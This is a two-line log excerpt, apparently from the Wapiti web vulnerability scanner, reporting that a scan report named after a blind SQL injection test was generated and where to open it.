+2024-03-20 15:24:51.849 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//sqli_blind_item.json/
+2024-03-20 15:24:51.850 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//sqli_blind_item.json/web_03202024_1524.html with a browser to see this report.
